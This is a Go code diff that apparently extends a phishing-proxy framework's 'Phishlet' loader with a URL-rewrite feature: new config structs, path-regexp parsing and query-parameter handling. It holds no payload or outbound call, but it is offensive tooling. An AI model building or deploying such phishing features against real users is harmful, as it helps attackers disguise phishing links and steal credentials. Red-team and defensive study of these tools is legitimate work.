@@ -105,6 +105,15 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+type UrlRewrite struct {
+	domain       string         `mapstructure:"domain"`
+	path         *regexp.Regexp `mapstructure:"path"`
+	value        string         `mapstructure:"value"`
+	clear_params bool           `mapstructure:"clear_params"`
+	params       []ConfigParams `mapstructure:"query"`
+	exclude_keys []string       `mapstructure:"exclude_keys"`
+}
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -131,6 +140,7 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	urlRewrite       []UrlRewrite
 }
 
 type ConfigParam struct {
@@ -218,6 +228,21 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type ConfigParams struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+// NEW //
+type ConfigUrlRewrite struct {
+	Domain      *string         `mapstructure:"domain"`
+	Path        *string         `mapstructure:"path"`
+	Value       *string         `mapstructure:"value"`
+	ClearParams *bool           `mapstructure:"clear_params"`
+	Params      *[]ConfigParams `mapstructure:"query"`
+	ExcludeKeys *[]string       `mapstructure:"exclude_keys"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	RedirectUrl string             `mapstructure:"redirect_url"`
@@ -232,6 +257,7 @@ type ConfigPhishlet struct {
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
 	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	UrlRewrite  *[]ConfigUrlRewrite `mapstructure:"url_rewrite"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -264,6 +290,7 @@ func (p *Phishlet) Clear() {
 	p.password.search = nil
 	p.custom = []PostField{}
 	p.forcePost = []ForcePost{}
+	p.urlRewrite = []UrlRewrite{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
 }
@@ -758,6 +785,52 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Parse URL rewrites
+	if fp.UrlRewrite != nil {
+		for _, ur := range *fp.UrlRewrite {
+			if ur.Path == nil {
+				return fmt.Errorf("url_rewrite: missing `path` field")
+			}
+			
+			if ur.Value == nil {
+				return fmt.Errorf("url_rewrite: missing `value` field")
+			}
+			
+			urlRewrite := UrlRewrite{}
+			
+			if ur.Domain != nil {
+				urlRewrite.domain = p.paramVal(*ur.Domain)
+			}
+			
+			path_re, err := regexp.Compile(p.paramVal(*ur.Path))
+			if err != nil {
+				return fmt.Errorf("url_rewrite: invalid path regexp: %v", err)
+			}
+			urlRewrite.path = path_re
+			
+			urlRewrite.value = p.paramVal(*ur.Value)
+			
+			if ur.ClearParams != nil {
+				urlRewrite.clear_params = *ur.ClearParams
+			}
+			
+			if ur.Params != nil {
+				for _, p := range *ur.Params {
+					if p.Key != nil && p.Value != nil {
+						urlRewrite.params = append(urlRewrite.params, ConfigParams{Key: p.Key, Value: p.Value})
+					}
+				}
+			}
+			
+			if ur.ExcludeKeys != nil {
+				urlRewrite.exclude_keys = *ur.ExcludeKeys
+			}
+			
+			p.urlRewrite = append(p.urlRewrite, urlRewrite)
+		}
+	}
+	
 	return nil
 }
 
